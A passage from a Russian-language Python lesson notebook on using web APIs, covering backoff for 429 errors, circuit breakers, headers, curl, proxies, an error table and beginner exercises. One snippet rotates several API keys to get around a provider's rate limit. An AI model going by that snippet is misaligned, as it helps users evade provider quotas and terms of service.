# # Retry-After: 60                # Через сколько секунд можно повторить
# ```
#
# **2. В документации API**
# Обычно указаны в разделах Rate limits или Quotas
#
# **3. Эмпирически**
# 1. Начать с медленных запросов.
# 2. Увеличивать частоту постепенно.
# 3. Отслеживать ошибки 429.
#
# ---
#
# ## **Ошибка 429 — Too Many Requests**
#
# ### **Что это**
#
# HTTP-статус 429 означает, что вы превысили лимит запросов к API.
#
# ### **Как обрабатывать**
#
# **1. Простая обработка**
# ```python
# if response.status_code == 429:
#     retry_after = int(response.headers.get('Retry-After', 60))
#     print(f"Лимит превышен. Ждём {retry_after} секунд...")
#     time.sleep(retry_after)
#     # Повторить запрос
# ```
#
# **2. Exponential backoff (экспоненциальная задержка)**
# ```python
# import time
# import random
#
# def make_request_with_backoff(url, max_retries=5):
#     for attempt in range(max_retries):
#         response = requests.get(url)
#
#         if response.status_code == 200:
#             return response.json()
#
#         elif response.status_code == 429:
#             # Exponential backoff: 2^attempt * base_delay
#             base_delay = 1
#             delay = (2 ** attempt) * base_delay
#             # Добавляем случайность (jitter) для избежания "thundering herd"
#             jitter = random.uniform(0, 1)
#             sleep_time = delay + jitter
#
#             print(f"Попытка {attempt + 1}/{max_retries}: ждём {sleep_time:.2f} сек...")
#             time.sleep(sleep_time)
#         else:
#             raise Exception(f"Ошибка {response.status_code}")
#
#     raise Exception("Превышено количество попыток")
# ```
#
# **3. Использование библиотеки backoff**
# ```python
# import backoff
# import requests
#
# @backoff.on_exception(
#     backoff.expo,
#     requests.exceptions.HTTPError,
#     max_tries=5,
#     giveup=lambda e: e.response.status_code != 429
# )
# def make_request(url):
#     response = requests.get(url)
#     response.raise_for_status()  # Вызовет исключение при 429
#     return response.json()
# ```
#
# **4. Ротация API-ключей**
# ```python
# api_keys = ["key1", "key2", "key3"]
# current_key_index = 0
#
# def make_request_with_key_rotation(url):
#     global current_key_index
#
#     for _ in range(len(api_keys)):
#         headers = {"X-API-Key": api_keys[current_key_index]}
#         response = requests.get(url, headers=headers)
#
#         if response.status_code == 200:
#             return response.json()
#         elif response.status_code == 429:
#             # Переключаемся на следующий ключ
#             current_key_index = (current_key_index + 1) % len(api_keys)
#             print(f"Переключение на ключ {current_key_index + 1}")
#         else:
#             raise Exception(f"Ошибка {response.status_code}")
#
#     raise Exception("Все ключи исчерпаны")
# ```
#
# ### **Circuit breaker (предохранитель)**
#
# **Концепция:** если сервис начинает ошибаться, временно прекращаем запросы к нему.
#
# **Состояния:**
# - **closed** (закрыт) — нормальная работа;
# - **open** (открыт) — прекратить запросы, возвращать ошибку;
# - **half-open** (полуоткрыт) — проверка восстановления.
#
# **Простая реализация**
# ```python
# import time
# from enum import Enum
#
# class CircuitState(Enum):
#     CLOSED = "closed"
#     OPEN = "open"
#     HALF_OPEN = "half_open"
#
# class CircuitBreaker:
#     def __init__(self, failure_threshold=5, timeout=60):
#         self.failure_threshold = failure_threshold
#         self.timeout = timeout
#         self.failure_count = 0
#         self.last_failure_time = None
#         self.state = CircuitState.CLOSED
#
#     def call(self, func, *args, **kwargs):
#         if self.state == CircuitState.OPEN:
#             if time.time() - self.last_failure_time > self.timeout:
#                 self.state = CircuitState.HALF_OPEN
#             else:
#                 raise Exception("Circuit breaker is OPEN")
#
#         try:
#             result = func(*args, **kwargs)
#             if self.state == CircuitState.HALF_OPEN:
#                 self.state = CircuitState.CLOSED
#                 self.failure_count = 0
#             return result
#         except Exception as e:
#             self.failure_count += 1
#             self.last_failure_time = time.time()
#
#             if self.failure_count >= self.failure_threshold:
#                 self.state = CircuitState.OPEN
#
#             raise e
#
# # Использование
# breaker = CircuitBreaker()
#
# try:
#     response = breaker.call(requests.get, url)
# except Exception as e:
#     print(f"Circuit breaker заблокировал запрос: {e}")
# ```

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **5. Разбор возможных ошибок**
# ## **Почему API часто ведут себя нестабильно**
#
# ### Распространённые проблемы
#
# **1. Ответ отличается от документации:**
# - документация устарела;
# - API изменился, но документация не обновлена;
# - разные версии API ведут себя по-разному.
#
# **2. API возвращает HTML вместо JSON:**
# - ошибка 404 — страница не найдена (HTML страница с ошибкой);
# - ошибка 500 — сервер вернул HTML страницу с ошибкой;
# - редирект на страницу логина;
# - API требует авторизацию, но вернул HTML форму.
#
# **3. Требуются специальные заголовки:**
# - `User-Agent` — некоторые API блокируют запросы без него;
# - `Accept` — указание формата ответа;
# - `Content-Type` — формат отправляемых данных.
#
# **4. Структура JSON сильно вложенная:**
# - много уровней вложенности;
# - неочевидные названия ключей;
# - разные форматы для разных эндпоинтов.
#
# **5. Нестабильность сервера:**
# - временные сбои;
# - плановые обновления;
# - перегрузка сервера.
#
# ---
#
# ## **Диагностика неожиданных ответов**
#
# ### **Пошаговая диагностика**
#
# **1. Проверка статус-кода**
# ```python
# response = requests.get(url)
# print(f"Status Code: {response.status_code}")
# print(f"Status Text: {response.reason}")
# ```
#
# **2. Анализ заголовков**
# ```python
# print("Заголовки ответа:")
# for key, value in response.headers.items():
#     print(f"  {key}: {value}")
#
# # Важные заголовки:
# # Content-Type — тип содержимого
# # X-RateLimit-* — информация о лимитах
# # Retry-After — когда можно повторить запрос
# ```
#
# **3. Просмотр содержимого**
# ```python
# # Первые 500 символов (часто ошибка там)
# print("Первые 500 символов:")
# print(response.text[:500])
# ```
#
# **4. Сохранение для анализа**
# ```python
# # Сохранить в файл
# filename = f"response_{response.status_code}.html"
# with open(filename, "w", encoding="utf-8") as f:
#     f.write(response.text)
# print(f"Ответ сохранён в {filename}")
# ```
#
# **5. Обработка ошибок JSON**
# ```python
# try:
#     data = response.json()
# except ValueError as e:
#     print(f"Ошибка парсинга JSON: {e}")
#     print(f"Content-Type: {response.headers.get('Content-Type')}")
#     print(f"Первые 200 символов: {response.text[:200]}")
# ```
#
# ---

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **6. Работа с JSON-структурами**
#
# ### **Вложенные структуры**
#
# Пример сложного ответа
# ```json
# {
#   "meta": {"count": 1, "page": 1},
#   "data": [
#     {
#       "id": 1,
#       "user": {
#         "name": "Alex",
#         "age": 19,
#         "contacts": {
#           "email": "alex@example.com",
#           "phone": "+1234567890"
#         }
#       }
#     }
#   ]
# }
# ```
#
# Извлечение данных
# ```python
# data = response.json()
#
# # Прямой доступ
# user_name = data["data"][0]["user"]["name"]
# user_email = data["data"][0]["user"]["contacts"]["email"]
#
# # Безопасный доступ (не вызовет KeyError)
# user_name = data.get("data", [{}])[0].get("user", {}).get("name", "Unknown")
#
# # Или с обработкой ошибок
# try:
#     user_name = data["data"][0]["user"]["name"]
# except (KeyError, IndexError) as e:
#     print(f"Ошибка доступа к данным: {e}")
#     user_name = None
# ```
#
# ### **Парсинг списков объектов**
#
# Пример ответа с массивом
# ```json
# {
#   "results": [
#     {"city": "Moscow", "temp": 22, "humidity": 65},
#     {"city": "Berlin", "temp": 18, "humidity": 70}
#   ]
# }
# ```
#
# Обработка
# ```python
# data = response.json()
#
# # Проход по всем элементам
# for item in data.get("results", []):
#     print(f"{item['city']}: {item['temp']}°C")
#
# # Фильтрация
# cold_cities = [item for item in data.get("results", []) if item["temp"] < 20]
#
# # Поиск
# moscow = next((item for item in data.get("results", []) if item["city"] == "Moscow"), None)
# ```
#
# ---
#
# # **7. Заголовки HTTP и их использование**
#
# ### **Зачем нужны заголовки**
#
# Заголовки передают метаданные о запросе/ответе:
# - авторизация;
# - формат данных;
# - информация о клиенте.
#
# ### **Важные заголовки для запросов**
#
# **1. User-Agent**
# ```python
# # Некоторые API блокируют запросы без User-Agent
# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
# }
# ```
#
# **2. Accept**
# ```python
# # Указываем, какой формат ответа хотим получить
# headers = {
#     "Accept": "application/json"  # или "application/xml", "text/html"
# }
# ```
#
# **3. Content-Type**
# ```python
# # Указываем формат отправляемых данных
# headers = {
#     "Content-Type": "application/json"
# }
# data = {"name": "Alex"}
# response = requests.post(url, json=data, headers=headers)
# ```
#
# **4. Authorization:**
# ```python
# headers = {
#     "Authorization": "Bearer token123"
# }
# ```
#
# ### **Безопасность заголовков**
#
# **Риски:**
# - подделка `User-Agent` может нарушить ToS сервиса;
# - некоторые API отслеживают подозрительные заголовки.
#
# **Рекомендации:**
# - используйте реалистичные заголовки;
# - не пытайтесь обмануть систему безопасности;
# - соблюдайте правила использования API.
#
# ---
#
# # **8. Тестирование API вручную**
#
# ### **Инструменты для тестирования**
#
# **1. Браузер**
# ```
# Просто откройте URL в браузере:
# https://api.example.com/users/123
#
# Плюсы: быстро, визуально.
# Минусы: только GET-запросы, сложно с авторизацией.
# ```
#
# **2. curl (терминал)**
# ```bash
# # GET-запрос
# curl https://api.example.com/users/123
#
# # С заголовками
# curl -H "Authorization: Bearer token123" https://api.example.com/users/123
#
# # POST-запрос
# curl -X POST -H "Content-Type: application/json" \
#      -d '{"name":"Alex"}' \
#      https://api.example.com/users
# ```
#
# **3. Postman**
# - визуальный интерфейс;
# - сохранение запросов;
# - коллекции запросов;
# - автоматизация тестов.
#
# **4. HTTPie**
# ```bash
# pip install httpie
# http GET https://api.example.com/users/123
# http POST https://api.example.com/users name=Alex
# ```

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **9. Прокси и безопасность**
#
# ### **Зачем нужны прокси:**
#
# - обход блокировок — если IP заблокирован;
# - анонимность — скрытие реального IP;
# - тестирование — проверка работы из разных локаций.
#
# ### **Использование прокси**
#
# ```python
# # HTTP-прокси
# proxies = {
#     "http": "http://proxy.example.com:8080",
#     "https": "http://proxy.example.com:8080"
# }
#
# # С аутентификацией
# proxies = {
#     "http": "http://username:password@proxy.example.com:8080"
# }
#
# response = requests.get(url, proxies=proxies, timeout=10)
# ```
#
# ### **Риски использования прокси**
#
# **1. Безопасность:**
# - прокси видит весь трафик;
# - может перехватывать данные;
# - некоторые прокси логируют запросы.
#
# **2. Надёжность:**
# - прокси может быть медленным;
# - может падать;
# - может блокировать запросы.
#
# **3. Юридические:**
# - использование прокси может нарушать ToS;
# - некоторые сервисы запрещают прокси.
#
# **Рекомендации:**
# - используйте только доверенные прокси;
# - для продакшена — собственные прокси;
# - всегда используйте HTTPS через прокси;
# - не передавайте чувствительные данные через публичные прокси.
#
# ---
#
# # **10. Справочник частых ошибок**
#
# | Код | Ошибка | Причина | Решение |
# |-----|--------|---------|---------|
# | **400** | Bad Request | Неверный формат запроса | Проверить параметры, формат данных |
# | **401** | Unauthorized | Не авторизован | Проверить токен/ключ, обновить если истёк |
# | **403** | Forbidden | Нет доступа | Проверить права доступа, IP whitelist |
# | **404** | Not Found | Ресурс не найден | Проверить URL, версию API |
# | **429** | Too Many Requests | Лимит превышен | Добавить задержки, использовать backoff |
# | **500** | Internal Server Error | Ошибка сервера | Повторить позже, сообщить разработчикам |
# | **502** | Bad Gateway | Проблема с прокси | Повторить запрос |
# | **503** | Service Unavailable | Сервис недоступен | Подождать, проверить статус сервиса |
# | **504** | Gateway Timeout | Таймаут | Увеличить timeout, упростить запрос |
#
# **Ошибки в коде:**
#
# | Ошибка | Причина | Решение |
# |--------|---------|---------|
# | `KeyError` | Ключ отсутствует в словаре | Использовать `.get()` или проверить наличие |
# | `IndexError` | Индекс вне диапазона | Проверить длину списка |
# | `ValueError` | Неверный формат данных | Проверить тип данных, валидировать |
# | `Timeout` | Превышено время ожидания | Увеличить timeout или упростить запрос |
# | `ConnectionError` | Проблема с сетью | Проверить интернет, повторить запрос |

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **Практика**

# %% [markdown]
# ### **Задача 1. Узнать публичный IP с api.ipify.org**
#
# **Описание**
#
# Создайте скрипт, который:
#
# 1. Выполняет запрос к API `https://api.ipify.org?format=json`.
# 2. Выводит ваш публичный IP-адрес.
#
# **Пример ответа:**
#
# ```json
# {"ip":"123.45.67.89"}
# ```
#
# ---

# %% [markdown]
# ### **Задача 2. Определить местоположение по IP (ip-api.com)**
#
# **Описание**
#
# Создайте скрипт, который должен:
#
# 1. Получить ваш публичный IP с api.ipify.org.
# 2. Сделать запрос к `http://ip-api.com/json/{ip}` для получения данных о местоположении.
# 3. Вывести страну и город.
#
# **Подсказка**
#
# URL с подстановкой IP:
#
# ```
# http://ip-api.com/json/123.45.67.89
# ```
#
# ---

# %% [markdown]
# ### **Задача 3. Получить возраст по имени через Agify**
#
# **Описание:**
#
# Напишите скрипт, который:
#
# 1. Запрашивает у пользователя имя.
# 2. Делает запрос к `https://api.agify.io?name={name}`.
# 3. Выводит предполагаемый возраст и количество обработанных записей (`count`).
#
# ---

# %% [markdown]
# ### **Задача 4. Отправить сообщение в Telegram Bot**
#
# **Описание:**
#
# Создайте скрипт, который:
#
# 1. Запрашивает у пользователя текст сообщения.
# 2. Отправляет его в ваш Telegram-бот (через Bot API).
# 3. Проверяет статус ответа.
#
# **Подсказка**
#
# Запрос на отправку сообщения:
#
# ```
# https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage
# ```
#
# Параметры:
#
# * `chat_id`: ваш Chat ID.
# * `text`: текст сообщения.
#
# ---

# %% [markdown]
# ### **Задача 5. Проверка наличия ошибок при запросах**
#
# **Описание**
#
# Модифицируйте любой из предыдущих скриптов так, чтобы:
#
# * При коде ответа ≠ 200 выводилось сообщение об ошибке с кодом.
# * При ошибке преобразования JSON выводилось «Ошибка разбора JSON».
#
# ---

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **Итоги занятия**
#
# - Поняли концепцию API и его роль в современной разработке
# - Освоили принципы REST API
# - Изучили методы авторизации в API
# - Поняли основы безопасности API
# - Научились работать с ограничениями API
# - Освоили диагностику и обработку ошибок
# - Поняли роль HTTP-заголовков
